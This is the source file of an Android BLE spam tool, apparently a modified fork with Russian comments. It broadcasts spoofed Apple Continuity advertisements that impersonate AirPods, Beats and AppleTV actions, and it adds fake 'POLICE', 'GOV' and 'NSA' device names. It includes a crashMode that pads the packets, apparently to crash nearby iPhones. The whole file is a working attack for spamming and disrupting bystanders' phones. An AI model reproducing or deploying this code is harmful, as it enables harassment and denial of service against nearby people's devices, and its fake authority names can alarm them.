package com.tutozz.blespam;

import android.bluetooth.le.AdvertiseData;

import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class ContinuitySpam implements Spammer{
    public Runnable blinkRunnable;
    public ContinuityDevice[] devices;
    private int loop = 0;
    public boolean isSpamming = false;
    public boolean crashMode;
    ExecutorService executor = Executors.newSingleThreadExecutor();
    public ContinuitySpam(ContinuityDevice.type type, boolean crashMode) {
        this.crashMode = crashMode;
        // Init ContinuityDevices
        switch (type) {
            default:
            case DEVICE:
                devices = new ContinuityDevice[]{
                        // ОРИГИНАЛЬНЫЕ УСТРОЙСТВА
                        new ContinuityDevice("0x0E20", "AirPods Pro", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0620", "Beats Solo 3", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0A20", "AirPods Max", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x1020", "Beats Flex", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0055", "Airtag", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0030", "Hermes Airtag", ContinuityDevice.type.DEVICE),
                        
                        // 🎯 ШУТОЧНЫЕ УСТРОЙСТВА
                        new ContinuityDevice("0x0055", "🚨 POLICE iPhone", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0030", "📡 GOV iPad", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0E20", "👽 UFO Device", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0620", "💣 Bomb Squad", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0A20", "🚗 Tesla Security", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x1020", "🛰️ NSA Monitor", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0220", "⚡ Energy Dept", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0F20", "🎯 Military Grade", ContinuityDevice.type.DEVICE),
                        
                        // ОСТАЛЬНЫЕ ОРИГИНАЛЬНЫЕ УСТРОЙСТВА
                        new ContinuityDevice("0x0220", "AirPods", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0F20", "AirPods 2nd Gen", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x1320", "AirPods 3rd Gen", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x1420", "AirPods Pro 2nd Gen", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0320", "Powerbeats 3", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0B20", "Powerbeats Pro", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0C20", "Beats Solo Pro", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x1120", "Beats Studio Buds", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0520", "Beats X", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0920", "Beats Studio 3", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x1720", "Beats Studio Pro", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x1220", "Beats Fit Pro", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x1620", "Beats Studio Buds+", ContinuityDevice.type.DEVICE)
                };
                break;
            case ACTION:
                devices = new ContinuityDevice[]{
                        // ОРИГИНАЛЬНЫЕ ДЕЙСТВИЯ
                        new ContinuityDevice("0x13", "AppleTV AutoFill", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x27", "AppleTV Connecting...", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x20", "Join This AppleTV?", ContinuityDevice.type.ACTION),
                        
                        // 🎯 ШУТОЧНЫЕ ДЕЙСТВИЯ
                        new ContinuityDevice("0x13", "🚨 POLICE Surveillance", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x27", "📡 GOV Monitoring", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x20", "👽 Alien Connection", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x19", "💣 Bomb Squad Alert", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x1E", "🚗 Tesla Security", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x09", "🛰️ NSA Access", ContinuityDevice.type.ACTION),
                        
                        // ОСТАЛЬНЫЕ ОРИГИНАЛЬНЫЕ ДЕЙСТВИЯ
                        new ContinuityDevice("0x19", "AppleTV Audio Sync", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x1E", "AppleTV Color Balance", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x09", "Setup New iPhone", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x02", "Transfer Phone Number", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x0B", "HomePod Setup", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x01", "Setup New AppleTV", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x06", "Pair AppleTV", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x0D", "HomeKit AppleTV Setup", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x2B", "AppleID for AppleTV?", ContinuityDevice.type.ACTION)
                };
                break;
        }
    }

    public void start() {
        executor.execute(() -> {
            BluetoothAdvertiser b = new BluetoothAdvertiser();
            isSpamming = true;
            for (loop = 0; loop <= Helper.MAX_LOOP; loop++) {
                if(isSpamming) {
                    // Random device - ТЕПЕРЬ БУДУТ ВЫБИРАТЬСЯ ШУТОЧНЫЕ УСТРОЙСТВА!
                    ContinuityDevice device = devices[new Random().nextInt(devices.length)];
                    AdvertiseData data = null;

                    if(device.getDeviceType() == ContinuityDevice.type.ACTION){
                        String rHex = Helper.randomHexFiller(6);
                        String manufacturerData = "0F05C0" + device.getValue() + rHex;
                        if(crashMode){ manufacturerData = "0F05C0" + device.getValue() + rHex + "000010" + rHex; }
                        data = new AdvertiseData.Builder()
                                .addManufacturerData(0x004C, Helper.convertHexToByteArray(manufacturerData))
                                .build();

                    }else if(device.getDeviceType() == ContinuityDevice.type.DEVICE){
                        String continuityType = "07";
                        String size = "19";
                        String prefix = "01";
                        if(device.getName() == "Airtag") prefix = "05" ;
                        String budsBatteryLevel = String.format("%02X",new Random().nextInt(10) * 10 + new Random().nextInt(10));
                        String caseBatteryLevel = String.format("%02X",new Random().nextInt(8) * 10 + new Random().nextInt(10));
                        String lidOpenCounter = String.format("%02X",new Random().nextInt(256));
                        String filler = Helper.randomHexFiller(32);
                        data = new AdvertiseData.Builder()
                                .addManufacturerData(0x004C, Helper.convertHexToByteArray(continuityType + size + prefix + device.getValue() + "55" + budsBatteryLevel + caseBatteryLevel + lidOpenCounter + "0000" + filler))
                                .build();
                    }
                    // Advertise
                    b.advertise(data, null);
                    // Wait before next advertise
                    try {
                        System.out.println(Helper.delay);
                        Thread.sleep(Helper.delay);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    // Stop this advertise to start the next one
                    b.stopAdvertising();
                }
            }
        });
    }

    public boolean isSpamming(){
        return isSpamming;
    }
    public void stop() { loop = Helper.MAX_LOOP+1; isSpamming = false; }
    public Runnable getBlinkRunnable(){ return blinkRunnable; }
    public void setBlinkRunnable(Runnable blinkRunnable){ this.blinkRunnable = blinkRunnable; }
}